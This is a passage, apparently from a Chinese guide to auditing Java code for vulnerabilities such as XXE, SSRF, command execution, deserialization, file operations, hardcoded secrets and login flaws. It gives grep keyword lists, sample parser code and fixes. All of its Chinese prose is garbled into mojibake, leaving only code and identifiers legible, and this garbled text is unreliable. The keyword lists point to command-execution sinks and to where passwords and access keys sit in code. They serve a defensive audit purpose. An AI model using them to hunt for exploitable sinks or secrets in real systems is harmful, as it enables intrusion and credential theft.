¶ä»è¯·æ±ï¼è¯·æ±å°åç±å®¢æ·ç«¯ä¼ å¥ï¼\n 2. ä¸»è¦çåæ°æ¯å¦å¯æ§ï¼æ¯å¦å­å¨è¿æ»¤ï¼åè®®ãç«¯å£ç­çéå¶æªæ½ãç¸å³çéå¶æªæ½æ¯å¦å®åï¼\n 3. éå¸¸æåµä¸ï¼é¡¹ç®ä¼å°è£ä¸ä¸ªç¨äºåèµ·è¯·æ±çæ¹æ³ï¼é¤ä¸è¿°å³é®å­è¿éè¦æ¾è¯¥æ¹æ³å¨é¨è°ç¨ä½ç½®ã\n\n# ä¿®å¤æ¹å¼\n\n 1. å½ç®æ è¯·æ±ä¸ºååæ¶ï¼è·åååæå¯¹åºçIPå°åï¼é²æ­¢åé¨è§£æç»è¿ï¼\n 2. è®¾ç½®åç½å°åé»ååæç½ååï¼\n 3. è®¾ç½®åè®®ç½ååï¼\n 4. æ£æ¥å¯¹åºçIPå°åæ¯å¦ä¸ºé»ååå°åï¼\n 5. ç¦æ­¢302è·³è½¬ï¼æèå­å¨302è·³è½¬æ¶éå½è·åè·³è½¬çURLï¼å¤æ­æ¯å¦ä¸ºé»ååå°åï¼\n 6. ç¦æ­¢å¶ä»éå¿è¦çåè®®ã\n\n\n# XXE\n\n> åçï¼æå¡å¨æ¥æ¶æ¥èªæ»å»èæ¶ææé çXMLæ°æ®ï¼å¨è§£æXMLæ°æ®æ¶ï¼æ²¡æä¸¥æ ¼çå®å¨æ§å¶æªæ½ï¼å¯¼è´XMLå¤é¨å®ä½æ³¨å¥ãé æä»»ææä»¶è¯»åãæ§è¡å½ä»¤ãä¿¡æ¯æ³é²ç­åæã\n\nJavaå¨è§£æXMLæ¶éå¸¸æåç§æ¹å¼ï¼DOMãSAXãDOM4JãJDOMã\n\n//1. DocumentBuilder åçãå¯åæ¾\nimport javax.xml.parsers.DocumentBuilderFactory;\nDocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\nDocumentBuilder db = dbf.newDocumentBuilder();\nStringReader sr = new StringReader(xml_con);\nInputSource is = new InputSource(sr);\nDocument document = db.parse(is); \n\n//2. saxReader ç¬¬ä¸æ¹åº\nimport org.dom4j.io.SAXReader;\nSAXReader saxReader = new SAXReader();\nDocument document = saxReader.read(request.getInputStream());\n\n//3. SAXBuilder ç¬¬ä¸æ¹åº\nimport org.jdom2.input.SAXBuilder;\nSAXBuilder builder = new SAXBuilder();  \nDocument document = builder.build(request.getInputStream());\n\n//4. SAXParserFactory åçãä¸å¯åæ¾\nimport javax.xml.parsers.SAXParserFactory;\nSAXParserFactory factory  = SAXParserFactory.newInstance(); \nSAXParser saxparser = factory.newSAXParser();\nSAXHandler handler = new SAXHandler();  \nsaxparser.parse(request.getInputStream(), handler);\n\n// å¶ä»æ¹å¼\nimport org.xml.sax.helpers.XMLReaderFactory;\nXMLReader xmlReader = XMLReaderFactory.createXMLReader();\nxmlReader.parse( new InputSource(new StringReader(xml_con)) );\n\nimport org.apache.commons.digester3.Digester;\nDigester digester = new Digester();\ndigester.parse(new StringReader(xml_con)); \n\nimport javax.xml.parsers.DocumentBuilderFactory;\nDocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\ndbf.setXIncludeAware(true);   // æ¯æXInclude\ndbf.setNamespaceAware(true);  // æ¯æXInclude\nDocumentBuilder db = dbf.newDocumentBuilder();\nStringReader sr = new StringReader(xml_con);\nInputSource is = new InputSource(sr);\nDocument document = db.parse(is);  // parse xml\n\nSAXParserFactory spf = SAXParserFactory.newInstance();\nSAXParser saxParser = spf.newSAXParser();\nXMLReader xmlReader = saxParser.getXMLReader();\nxmlReader.parse( new InputSource(new StringReader(xml_con)) );\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n# ä»£ç æç´¢èå´\n\n*ã*.java\n\n\n# æç´¢å­ç¬¦ä¸²åå®¹\n\nXML\nXMLReader\nSAXParser\nSAXBuilder\nDocumentBuilder\ndocument.parse(\n\n\n1\n2\n3\n4\n5\n6\n\n\nXMLè§£æå¸¸è§çåï¼\n\njavax.xml.parsers.DocumentBuilderFactory;\njavax.xml.parsers.SAXParser\njavax.xml.transform.TransformerFactory\njavax.xml.validation.Validator\njavax.xml.validation.SchemaFactory\njavax.xml.transform.sax.SAXTransformerFactory\njavax.xml.transform.sax.SAXSource\norg.xml.sax.XMLReader\norg.xml.sax.helpers.XMLReaderFactory\norg.dom4j.io.SAXReader\norg.jdom.input.SAXBuilder\norg.jdom2.input.SAXBuilder\njavax.xml.bind.Unmarshaller\njavax.xml.xpath.XpathExpression\njavax.xml.stream.XMLStreamReader\norg.apache.commons.digester3.Digester\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# å¤æ­ä¾æ®\n\n 1. è§£æå¨è§£æçXMLéè¦å¤é¨å¯æ§ï¼\n 2. æªç¦ç¨DTDæèåè®¸å¤é¨å®ä½ï¼\n 3. å¤§å¤æ°é¡¹ç®é½ä¼å°è£ä¸ä¸ªç¨äºè§£æXMLçæ¹æ³ï¼å æ­¤é¤ä¸è¿°å³é®å­ä»¥å¤ï¼è¿éè¦å¯»æ¾å¯¹åºæ¹æ³çè°ç¨ä½ç½®éä¸ªå¤æ­ã\n\n# ä¿®å¤æ¹å¼\n\nXXEä¿®å¤æ¹å¼ç¸å¯¹ç®åï¼ç¦ç¨DTDsæèç¦æ­¢ä½¿ç¨å¤é¨å®ä½å³å¯ã\n\ndbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); //ç¦ç¨DTDs (doctypes),å ä¹å¯ä»¥é²å¾¡ææxmlå®ä½æ»å»\n//å¦æä¸è½ç¦ç¨DTDs,å¯ä»¥ä½¿ç¨ä¸ä¸¤é¡¹ï¼å¿é¡»ä¸¤é¡¹åæ¶å­å¨\ndbf.setFeature("http://xml.org/sax/features/external-general-entities", false);      //é²æ­¢å¤é¨æ®éå®ä½POC æ»å»\ndbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);   //é²æ­¢å¤é¨åæ°å®ä½POCæ»å»\n\n\n1\n2\n3\n4\n\n\n\n# ä»»ææä»¶æä½\n\n> åçï¼ä»»ææä»¶æä½åå«ä»»ææä»¶ä¸è½½ãå é¤ãä¸ä¼ ãç®å½ï¼æä»¶ï¼éåãè§£åç¼©ç­ãæ»å»èå¯ä»¥å©ç¨ä¸è¿°æ¼æ´æ¶ææä½æå¡å¨æä»¶ã\n\n# ä»£ç æç´¢èå´\n\n*ã*.java\n\n# æç´¢å­ç¬¦ä¸²åå®¹\n\nnew File(\nString path\nString fileName\nnew FileInputStream(\nnew FileOutputStream(\nnew FileReader\nresponse.setContentType("application/octet-stream; charset=utf-8");\nfile.delete();\nFileUtils.\nnew ZipEntity(\nfile.getName(\n.unzip(\n.mkdirs(\nstream.write(\nsave2File(\nfosãfis.close()\npublic class ZipUtil\nMultipartFile(\nfile.getOriginalFilename(\nupload\ndownload\nä¸ä¼  // ææ³¨é\nä¸è½½ // ææ³¨é\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n# å¤æ­ä¾æ®\n\n 1. æªå¯¹æä»¶è·¯å¾ãæä»¶åç§°ãæä»¶ç±»åååçéå¶ï¼ä¸ä¼ æä»¶è·¯å¾æèæä»¶åç§°å¯å­å¨../ç®å½è·¨è¶çæä½ï¼\n 2. å¨è§£åç¼©æä»¶æ¶æªå¯¹åç¼©åä¸­çæä»¶ç±»åè¿è¡éå¶ï¼\n 3. æªéå¶ä¸ä¼ æä»¶å¤§å°ï¼\n 4. éå¸¸æåµä¸å¨è§£åç¼©æä»¶æ¶ï¼å¼åä¸è¬é½ä¼åå»ºä¸ä¸ªä¸´æ¶ç®å½ï¼è§£åå®æä¹åå°ä¸´æ¶æä»¶å¤¹å é¤ï¼å¦æä¸´æ¶æä»¶å¤¹åç§°å¯ä»¥æ§å¶ï¼åå¯ä»¥è¾¾å°ä»»ææä»¶å é¤çç®çï¼\n 5. å¤æ­æä»¶ç±»åçæä½æ¶ï¼å¼åä¸è¬åè·åå°æä»¶åç§°ï¼ç¶åä½¿ç¨filename.substring(filename.lastIndexOf("."));è·åæä»¶åç¼åï¼å¦ææ­¤å¤ä½¿ç¨filename.indexOf(".")åå¯è½å­å¨ç»è¿å¯è½ã\n\n# ä¿®å¤å»ºè®®\n\n 1. å¤æ­ä¸ä¼ æ°æ®åçcontent-type\n 2. è®¾ç½®ä¸ä¼ æä»¶ç±»åç½ååï¼ä¸ä¼ æä»¶åéå½åï¼éå½åç±»åä¸ä»ä¸ä¼ æä»¶ä¸­è·åï¼\n 3. éå¶æä»¶ä¸ä¼ çå¤§å°ï¼\n 4. å½ä¼ éåæ°ä¸ºæä»¶è·¯å¾æ¶ï¼éè¦å¤æ­è·¯å¾ä¸­æ¯å¦å­å¨../è·¨ç®å½æä½ï¼\n 5. å½åæ°åæ¶å­å¨pathåfileNameæ¶ï¼åå«å¯¹pathãfileNameåæ¼æ¥ç»æè¿è¡å¤æ­åéå¶ï¼\n 6. éå¶ä¸è½½ãå é¤å¯æä½çæ ¹æä»¶å¤¹ã\n\n\n# å½ä»¤æ§è¡\n\n> åçï¼æå¡å¨æ§è¡æ»å»èä¼ å¥çæ¶æå½ä»¤å¹¶æ§è¡ï¼å¯¼è´æ»å»èå¯è·åæå¡å¨æéãææä¿¡æ¯ç­ã\n\n# ä»£ç æç´¢èå´\n\n*,*.java\n\n# æç´¢å­ç¬¦ä¸²åå®¹\n\nString cmd\nString command\nProcessBuilder\nRuntime\n.exec(\nnew ScriptEngineManager() // å è½½JSæä»¶\nnew Yaml();  // snakeyamlå¡åºååæ¼æ´æ§è¡å½ä»¤\nnew GroovyShell(); \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# å¤æ­ä¾æ®\n\næ§è¡å½ä»¤åæ°å¯æ§ï¼ä¸ºè¿è¡ç½ååæèè¿æ»¤æä½æä¸ä¸¥æ ¼ï¼æªè¿è¡è½¬ä¹ç¹æ®å­ç¬¦æä½æä¸ä¸¥æ ¼ã\n\n# ä¿®å¤å»ºè®®\n\n 1. éå¿è¦ä¸è°ç¨ç³»ç»å½ä»¤ï¼\n 2. è°ç¨ç³»ç»å½ä»¤æ¶ä¸ä½¿ç¨åå°ä¼ å¥çå½ä»¤ï¼ä½¿ç¨idçæ¹å¼éæ©å¯æ§è¡çå½ä»¤ï¼\n 3. è®¾ç½®å¯æ§è¡å½ä»¤ç½ååï¼ä¸åè®¸ä½¿ç¨ && || & | ;ç­å½ä»¤å¹¶åçç¹æ®å­ç¬¦ï¼\n 4. æ§å¶æ§è¡å½ä»¤ç¨æ·æéï¼\n 5. å½ä»¤æ§è¡æ¼æ´å¨å®éå·¥ä½ä¸­åç°çè¾å°ã\n\n\n# ä¸å®å¨çååºåå\n\n> åçï¼æå¡å¨å¯¹ç¨æ·å¯æ§çæ°æ®è¿è¡ååºååæ¶ï¼æ»å»èå¯æé æ¶æçååºååå¯¹è±¡ï¼å°æå®³æ°æ®ä¼ éå°åºç¨ä»£ç ä¸­ã\n> \n> Javaååºååæ¼æ´å¨Javaå®å¨ä¸­å æ®éè¦çå°ä½ï¼ä¸äºéç¨ç»ä»¶çæ¼æ´å¾å¾æ¯ç±ååºååæ¼æ´å¼èµ·çãä½å¨å®éå·¥ä½ä¸­ï¼å¼åäººåè¿è¡ååºååæä½å¯è½æ§è¾å°ã\n\n# ä»£ç æç´¢èå´\n\n*ã*.java\n\n# æç´¢å­ç¬¦ä¸²åå®¹\n\nreadObject(\n\n\n1\n\n\n# å¤æ­ä¾æ®\n\n 1. ååºååæ°æ®å¯æ§ï¼æ§è¡ååºååæä½ï¼ååºååå¯¹è±¡readObjectæ¹æ³ä¸­å­å¨å±é©æä½ã\n 2. éå¸¸æåµä¸æ¯ä¸æ¹ç»ä»¶ä¸­å­å¨æ¼æ´ï¼å¯¼è´ååºååãå æ­¤åªéè¦å¤æ­é¡¹ç®ä¸­æ¯å¦å¼ç¨äºåå«æ¼æ´çä¸æ¹ç»ä»¶çæ¬å³å¯ï¼å¦æå¼å¥äºåå»ºè®®åçº§ï¼å¦ææ æ³åçº§ï¼åçæ¯å¦æ»¡è¶³å©ç¨æ¡ä»¶ï¼å¹¶å©ç¨wafæ¦æªç¸å³çè¯·æ±ã\n\n# ä¿®å¤å»ºè®®\n\n 1. è®¾ç½®å¯ååºååçç±»ç½ååï¼ä¸åè®¸ååå¤çç±»è¿è¡ååºååï¼\n 2. ä½¿ç¨å®å¨çä¸æ¹ç»ä»¶ã\n\n\n# URLè·³è½¬\n\n> åçï¼å®¢æ·ç«¯ç¨æ·å¯æ§è·³è½¬URLå°åï¼æ»å»èå¨æå¡ç«¯åèµ·è·³è½¬æ¶æå®æ¶æå°åï¼å¯è·³è½¬å°éé±¼æå¶ä»è¿æ³è¿è§é¡µé¢ã\n\n# æç´¢èå´\n\n* ï¼ *.java\n\n# æç´¢å­ç¬¦ä¸²åå®¹\n\nString url\nString returnUrl\nString returnPath\nString path\nsendRedirect\nforword\nredirect:\n.setHeader("refresh"\n.setStatus(302)\n.setHeader("location"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# å¤æ­ä¾æ®\n\n 1. è·³è½¬çURLå°åç¨æ·å¯æ§ï¼æªç»è¿è¿æ»¤å¤æ­æè¿æ»¤å¤æ­ä¸ä¸¥æ ¼ï¼\n 2. URLè·³è½¬æ¼æ´å¯éåSSRFæ¼æ´ï¼å½SSRFä¸å®å¨æ ¡éªå°åæ¶ï¼å¯ä»¥å©ç¨URLè·³è½¬æ¼æ´è¯·æ±è·³è½¬ä¹åçå°åã\n\n# ä¿®å¤å»ºè®®\n\n 1. è®¾ç½®è·³è½¬å°åç½åå\n 2. å¦æè·³è½¬å°åæ¯åºå®çï¼åå¯ä»¥ä½¿ç¨idç´¢å¼å°åï¼é²æ­¢ç¨æ·ç´æ¥ä¼ å¥ï¼\n 3. åçæè·³è½¬é¾æ¥åå¶ç­¾åï¼è·³è½¬åè¿è¡ç­¾åéªè¯ã\n\n\n# ç¡¬ç¼ç \n\n> åçï¼å½ç¨æ·å¯ä»¥è·åå°ç¨åºæºä»£ç æèç»è¿å¶ä»æ¼æ´è·åå°ç¨åºæºä»£ç æ¶ï¼ç¡¬ç¼ç çå¯ç ç­ææä¿¡æ¯å¯ç´æ¥è¢«ç¨æ·è·åã\n\n# æç´¢èå´\n\n* è¿ååç«¯ä»£ç ä¸èµ·æç´¢ï¼å¯è½æç´¢å°åç«¯è®¤è¯ç¨æ·å¯ç ãäºæå¡idåkeyç­ä¿¡æ¯ã\n\n# æç´¢å­ç¬¦ä¸²åå®¹\n\npass\npwd\nkey\naccessKeyId\naccesskey\naccessid\n\n\n1\n2\n3\n4\n5\n6\n\n\n# å¤æ­ä¾æ®\n\nä»£ç ä¸­æææçå¯ç ãå¯é¥ç­ä¿¡æ¯ï¼éå¸¸ä¸åå«ååæµè¯javaæä»¶ï¼\n\n# ä¿®å¤å»ºè®®\n\n 1. å å¯å­å¨å°éç½®æä»¶ä¸­ï¼ç¶åä»£ç ä¸­è¯»åéç½®æä»¶è·åå¯ç ãå¯é¥ï¼\n 2. ä½¿ç¨éç½®ä¸­å¿æèå­å¨å°æ°æ®åºä¸­ã\n\n\n# ä¸å®å¨çå å¯æ¹å¼\n\n> åçï¼ä¸å®å¨çå å¯æ¹å¼åå«ä½¿ç¨ä¸å®å¨çå å¯ç®æ³å¯¼è´æ»å»èå¯¹å å¯æ°æ®å¯éï¼æèä½¿ç¨ä¸ç¬¦åè¦æ±é¿åº¦çå¯é¥è¿è¡å å¯æä½ã\n\n# æç´¢èå´\n\n*.javaã*.propertiesã*.yaml\n\n# æç´¢å­ç¬¦ä¸²åå®¹\n\nDES\nDESUtil\nSHA1\nECB\nRSA // çå¯é¥é¿åº¦\nMD5 // å­å¨æ°æ®éè¦å ç\n\n\n1\n2\n3\n4\n5\n6\n\n\n# å¤æ­ä¾æ®\n\n 1. ä½¿ç¨ä¸å®å¨çå å¯æ¹å¼å å¯æ°æ®ï¼\n 2. å®å¨çå å¯æ¹å¼å¯é¥é¿åº¦ä¸ç¬¦åè¦æ±\n 3. å¼åäººåç»å¸¸å¨åç«¯ä½¿ç¨AESå å¯æ°æ®åéå°åç«¯ï¼å ä¸ºAESæ¯å¯¹ç§°å å¯çï¼åç«¯å¿å®å­å¨AESå¯é¥ï¼JSæèè¯·æ±è·åï¼å¯¼è´æ°æ®å å¯ä¼ è¾å½¢åèè®¾ï¼\n 4. æäºå¼åäººåä¸ºäºæµè¯æ¹ä¾¿ï¼ä¼é¢çå è§£å¯æ¥å£ï¼éå¸¸åç§°ä¸ºdecryptåencryptæèjiamiåjiemiï¼\n 5. base64ä¸æ¯å å¯æ¹å¼ï¼æ¾ç»è§è¿è¯·æ±å¤´ä¸­çè®¤è¯ä¿¡æ¯æ¯base64ç¼ç çç¨æ·ååå¯ç ä¸²ã\n\n# ä¿®å¤å»ºè®®\n\n 1. ä½¿ç¨å®å¨çéå¯¹ç§°å å¯ç®æ³\n 2. å å¯ç®æ³å¯é¥é¿åº¦åºè¯¥ç¬¦åå®å¨è¦æ±\n 3. ä½¿ç¨MD5å å¯å­å¨å¯ç ä¿¡æ¯æ¶åºå½å çï¼å»ºè®®ä½¿ç¨è¡¨ä¸­UUIDãcreateDateç­å·æè¿·ææ§è´¨çéæºçï¼\n\n\n# æ¥å¿ä¼ªé \n\n> åçï¼å°æªç»éªè¯çç¨æ·è¾å¥åå¥æ¥å¿æä»¶å¯è´ä½¿æ»å»èä¼ªé æ¥å¿æ¡ç®æå°æ¶æä¿¡æ¯åå®¹æ³¨å¥æ¥å¿ã\n\n# æç´¢èå´\n\n*.java\n\n# æç´¢å­ç¬¦ä¸²åå®¹\n\n.info(\n.error(\n.debug(\n.warn(\n\n\n1\n2\n3\n4\n\n\n# å¤æ­ä¾æ®\n\n 1. æ¥å¿æå°åå®¹å¯æ§ï¼\n 2. æ¥å¿åå®¹æªè¿æ»¤\n\n# ä¿®å¤å»ºè®®\n\n 1. æ¥å¿åå®¹åºå®ï¼\n 2. è¿æ»¤æå°åå®¹ï¼è®¾ç½®å¯æå°å­ç¬¦ç½ååï¼ä¸åè®¸æå°æ¢è¡\\n\n\n\n# ææä¿¡æ¯æ³é²\n\n> åçï¼ææä¿¡æ¯æ³é²åå«ç³»ç»ææä¿¡æ¯æ³é²åç¨æ·ææä¿¡æ¯æ³é²ã\n\nç³»ç»çææä¿¡æ¯æ³é²éå¸¸ç±ç³»ç»æ§è¡ä»£ç å¼å¸¸å¯¼è´çï¼ç±äºæªè®¾ç½®ç»ä¸çæ¥éé¡µé¢ï¼å¯è½ç´æ¥å°æ¥éä¿¡æ¯è¿åç»æµè§å¨ï¼å¶ä¸­å¯è½åå«æäºéç½®ãè°ç¨æ ãSQLè¯­å¥ãè·¯å¾ç­ã\n\nç¨æ·ææä¿¡æ¯æ³é²éå¸¸æ¯ç±æå¡å¨è¿åè¾å¤çç¨æ·ä¿¡æ¯ï¼å¯ç ï¼æèè¿åæªè±æçæ°æ®å¯¼è´çã\n\n# æç´¢èå´\n\n*.java\n\n# æç´¢å­ç¬¦ä¸²åå®¹\n\npassword\npass\naddress\nidNo\nphoneNo\nâ¦â¦\n\n\n1\n2\n3\n4\n5\n6\n\n\n# å¤æ­ä¾æ®\n\n 1. æ¯å¦å­å¨ç»ä¸æ¥éè¿åï¼\n 2. è¿åç»ææ¯å¦åå«ææåå®¹ã\n 3. å¯¹äºå¤§åé¡¹ç®æ¥è¯´ï¼è¿åçç»æå¾å¾è¢«å°è£æå®ä½åè¿åï¼å æ­¤å¯ä»¥æ¥æ¾è¿åçç»æå°è£ä¸­æ¯å¦åå«ä»¥ä¸çå­æ®µï¼å¦æåå«åè¿½è¸ªå°å¯¹åºçä½ç½®ï¼æ¥çæ¯å¦è¿è¡è±ææèæ¸ç©ºã\n\n# ä¿®å¤å»ºè®®\n\n 1. å®å¶ç»ä¸æ¥éé¡µé¢æèç»ä¸æ¥éjsonè¿åï¼\n 2. åªè¿åå¿è¦çä¿¡æ¯ï¼å¯ç ç­å­æ®µä¸åºè¿åï¼ææå­æ®µè±æè¿åã\n\n\n# å®å¨éç½®éè¯¯\n\n> åçï¼ç±äºå¼åå¨éç½®ç»ä»¶æ¶çæ æè¯æèæ¹ä¾¿ä½¿ç¨ï¼å¯¼è´æ»å»èå¯ä»¥æªææè®¿é®ç¬¬ä¸æ¹ç»ä»¶ï¼å¯¼è´ä¿¡æ¯æ³é²ã\n\n# åç°æ¹å¼\n\nçpomæä»¶æèlibä¸­æ¯å¦å­å¨å¯è½æéç½®éè¯¯çç»ä»¶ï¼ç¶åæ¥çå¯¹åºçéç½®ã\n\nå¸¸è§çæå¯è½å­å¨é®é¢çç»ä»¶å¦ä¸ï¼Swagger ãShiroãSpringSecurityãDruidãSpring boot actuator\n\nç¸å¯¹äºç½çèè¨ï¼è¿ç§éç½®éè¯¯å¯¼è´çæªææé®é¢é»çå®¡è®¡æ´ä¸ºæ¹ä¾¿ãæ¹éè®¿é®å¯¹åºURLå¤æ­æ¯å¦è½å¤è®¿é®æåå³å¯ã\n\n# ä¿®å¤å»ºè®®\n\n 1. swaggerä¸å»ºè®®å¯¹å¬ç½å¼æ¾ï¼\n 2. å¦æç¡®å®å­å¨å¼æ¾çå¿è¦ï¼åå¿é¡»è¿è¡èº«ä»½è®¤è¯åæææä½ï¼\n 3. å¯ä»¥éç½®å¯ç å¯é¥çç»ä»¶éè¦éç½®å¯ç åå¯é¥ï¼å¹¶ä¿è¯å¯é¥çå¤æåº¦ã\n\n\n# XSS\n\n> åçï¼æ»å»èå©ç¨æ¶ææé çJSä»£ç ä½¿æµè§å¨å¨è§£ææ¶äº§çæ­§ä¹ï¼è¾¾å°æ»å»èæ»å»ç¨æ·æµè§å¨çç®çã\n\n# åç°æ¹å¼\n\nXSSæ¼æ´è¦çèå´è¾å¹¿ï¼æå¡ç«¯åå¤åéæ°æ®çåºæ¯é½æå¯è½äº§çXSSãXSSè¿ååç«¯ä½¿ç¨çæ¡æ¶ç¸å³ï¼æäºæ¡æ¶å¯¹äºXSSæå¾å¥½çé²æ¤æ§ãå æ­¤ç½çåç°XSSè¾ä¸ºå¤æï¼å¯ä»¥çä¸å¡é»è¾çä½ç½®è¾å©ççï¼åç°å­å¨å¯è½æ§çä½ç½®åï¼éåé»çå¨å·ä½çç«ç¹ä¸å°è¯æ¯å¦å¯ä»¥æåãä¹å¯ä»¥ççæ¯å¦å­å¨è¿æ»¤å¨ï¼å¯¹XSSè¿è¡å®ä½åè½¬ä¹æèè¿æ»¤ï¼è½¬ä¹æèè¿æ»¤æ¯å¦ä¸¥è°¨åè§èã\n\n# ä¿®å¤å»ºè®®\n\n 1. HTMLå®ä½å\n 2. Cookieè®¾ç½®httponly\n 3. è¿æ»¤ç¹æ®å­ç¬¦ãè¿æ»¤äºä»¶æ ç­¾\n\n\n# ä¸å¡é»è¾æ¼æ´å®¡è®¡æ¹å¼\n\n> ä¸å¡é»è¾æ¼æ´æ¯è¾å¤æï¼åå«ä¸å¡çåä¸ªæ¹é¢ï¼å¹¶ä¸åºæ¬æ²¡æå¯ç¨çæç´¢å­ç¬¦ä¸²åå®ä½æ¹å¼ï¼å¾å¾éè¦éè¯»åè½ç¹ä»£ç ï¼çè§£æç§åè½çæä½æµç¨ï¼åç°å¶ä¸­çå®å¨é£é©ã\n\n\n# è®¤è¯ç¸å³\n\n# æ³¨åé»è¾\n\nä»»æç¨æ·æ³¨å\n\nä»»æç¨æ·æ³¨åå¾å¾ç±äºæªè¦æ±ç¨æ·æä¾ææºå·ãé®ç®±ç­å¯ç¡®å®å½å±çèº«ä»½ä¿¡æ¯ãæªå¯¹ç¨æ·æä¾çèº«ä»½ä¿¡æ¯è¿è¡éªè¯æèèº«ä»½ä¿¡æ¯éªè¯çæµç¨å¯ç»è¿ãä»ä»£ç ä¸çè¡¨ç°å°±æ¯å­å¨ææºå·åé®ç®±çéªè¯ãææºå·é®ç®±çéªè¯åæå¥ç¨æ·è¡¨çæä½éè¦ä¸æ¬¡å®ææèå­å¨ååçæ ¡éªï¼é²æ­¢è¶è¿è¯·æ±ç´æ¥åèµ·æå¥ç¨æ·æ°æ®æä½ã\n\næ³¨åè¦çåç¨æ·\n\næ³¨åè¦çåç¨æ·éå¸¸åçå¨æ³¨ååä¿®æ¹ç¨æ·ä¿¡æ¯æ¥å£å¤ç¨çæåµä¸ï¼æèç¨æ·å¨æ³¨åæ¶æªéªè¯æ°æ³¨åçç¨æ·å¨å½åç³»ç»ä¸­æ¯å¦å­å¨ï¼å¦æéå¤æ³¨åç¨æ·ï¼å¯è½å­å¨åç¨æ·ä¿¡æ¯æ³é²ãæéæ¥ç®¡ç­é£é©ãä»£ç ä¸­ä¸»è¦çæ¯å¦æ ¡éªç¨æ·åçå¯ç¨æ§ã\n\nå¯ç ææå­å¨\n\nå¨å®å¨å¼åè§èä¸­è¦æ±å¯ç éè¦å å¯å­å¨ï¼éå¸¸å¼åäººåä½¿ç¨MD5å çå­å¨å¯ç ä¿¡æ¯ãä»£ç ä¸­å¦ææªåç°å å¯å­å¨è¡ä¸ºåå¯è½æææå¯ç å­å¨çé£é©ãå¦å¤æå¯è½åå°ä¼ è¿æ¥çå¯ç æ¬èº«å°±æ¯å å¯çï¼ä½æ¯å¹¶ä¸æå¡è¿ç§æ¹å¼ï¼å ä¸ºåå°æµè§å¨ç«¯çå å¯æ¯ç¨æ·å®éå¯æ§çã\n\nå¯ç çå¼ç¡¬ç¼ç \n\nå¨å¯ç å­å¨æ¶ï¼å»ºè®®ä½¿ç¨éæºçå¼è¿è¡å å¯ãä½¿ç¨ç»ä¸ççå å¯æ¶ï¼ä¼éä½å­å¨å¯ç çå®å¨æ§ãå¯ç¨çæ¹æ¡æ¯æ°æ®è¡¨ä¸­æ·»å ä¸åçå¼å­æ®µï¼æèä½¿ç¨ç°æçä¸å¯åçæ°æ®åºå­æ®µä¿¡æ¯ï¼æ¯å¦ï¼UUIDãCreateTimeï¼è¿è¡å çï¼ä½¿ç¨å¯ä¿®æ¹åå®¹å çå°å¯¼è´è®¤è¯å¤±è´¥ã\n\nå¯ç å¤æåº¦ä½\n\nåç«¯éªè¯å¯ç å¤æåº¦ï¼åç«¯ä¸éªè¯æ¶å¯ç»è¿å¯ç å¤æåº¦è¦æ±ãéè¦åç«¯è¿è¡å¯ç å¤æåº¦çæ ¡éªã\n\n# ç»å½é»è¾\n\nä»»æç¨æ·ç»å½\n\nä»»æç¨æ·ç»å½æçæ¯æå¡ç«¯ä¸éªè¯ç¨æ·å¯ç ãä»£ç ä¸çè¡¨ç°ä¸ºåå°æªä¼ å¥ç¨æ·å¯ç ä¿¡æ¯ï¼æèä¼ å¥å¯ç ä¿¡æ¯ä¹åï¼æªä½¿ç¨ç¨æ·åãå¯ç ç»å®æ¥è¯¢ç¨æ·ä¿¡æ¯ãè¿ç§æ¹å¼å°å¯¼è´ä»»æç¨æ·ç»å½ã\n\nç©ºå£ä»¤ç»å½\n\nç©ºå£ä»¤ç»å½æçæ¯ç¨æ·å¨éè¦è¾å¥ç¨æ·åå¯ç æ¶ï¼ä¼ éäºç©ºå­ç¬¦ä¸²æèæªä¼ éè¯¥åæ°ãå¨ä»¥mybaitsä¸ºä¾ï¼å¨æ¥è¯¢æ°æ®åºæ¶å¦æå¼åéç¨å¦ä¸çåæ³ï¼å°å¯¼è´å¯ç ä¸ºç©ºæèç©ºå­ç¬¦ä¸²æ¶ï¼ä¸å¸¦å¥æ¥è¯¢ã\n\n<if test="password != null and password != \'\'">\n  AND password = #{password}\n</if>\n\n\n1\n2\n3\n\n\nç»å½çç ´\n\nå¨è¿è¡ç¨æ·ç»å½æ¶æªè¿è¡åä¸ç¨æ·ãåä¸IPãåä¸ä¼è¯çç¨æ·ç»å½æ¬¡æ°éå¶æèæªä½¿ç¨éªè¯ç ï¼å¯å¯¼è´ç»å½çç ´ãè§£å³æ¹æ¡å¯éï¼\n\n * ä½¿ç¨å®å¨çäººæºäº¤äºéªè¯æ¹å¼\n * å¯¹åä¸ç¨æ·çå¤æ¬¡ç»å½å°è¯åé»æ­ï¼å°éè´¦å·ãéªè¯ç»å®ææºå·ï¼\n * å¯¹åä¸IPå¤æ¬¡ç»å½å¤±è´¥çå°è¯è¿è¡å°ç¦\n * éå¯¹åä¸åè¯å¤æ¬¡è´¦æ·ç»å½å°è¯åé»æ­\n * è®¾ç½®é£é©ç¨æ·ååï¼é£é©ç¨æ·ç»å½æ¶éè¦å¤å å­éªè¯\n\nç¨æ·åæä¸¾\n\nç¨æ·åæä¸¾ä¸»è¦åçå¨ç»å½æ¶ç»æè¿åãæ³¨ååçç¨æ·åå¯ç¨æ§æ¥è¯¢ãæ¾åå¯ç åçç¨æ·å¤æ­ã**æªææç¨æ·ä¿¡æ¯æ¥è¯¢ï¼è¾å°ï¼**çæ¥å£è¿åãè§£å³æ¹æ¡æ¯ç»å½å¤±è´¥æèæåãæ¾åå¯ç ç¨æ·å¤æ­è¿åç»ä¸çä¿¡æ¯ãå¦ç»å½å¤±è´¥å¯ç»ä¸è¿åâç¨æ·åæå¯ç éè¯¯ãâï¼æ³¨ååæèæ¾åå¯ç çç¨æ·åå¤æ­æ·»å éªè¯ç 